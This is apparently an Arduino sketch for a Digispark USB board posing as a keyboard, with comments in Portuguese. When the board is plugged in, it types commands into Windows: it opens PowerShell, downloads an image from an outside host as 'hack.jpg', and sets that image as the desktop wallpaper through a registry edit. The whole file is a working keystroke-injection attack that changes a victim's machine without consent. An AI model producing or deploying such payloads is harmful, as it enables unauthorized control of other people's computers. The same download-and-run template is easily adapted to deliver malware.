#include "DigiKeyboardPtBr.h"


void setup() {
  DigiKeyboard.delay(5000); // espera 5 segundos antes de começar
  
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("$client = new-object System.Net.WebClient");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("$client.DownloadFile(\"https://i.imgur.com/22KMA31.jpg\", \"hack.jpg\")");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("reg add \"HKCU\\Control Panel\\Desktop\" /v Wallpaper /d \"%USERPROFILE%\\hack.jpg\" /f");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  for (;;) {
    // vazio
  }
}
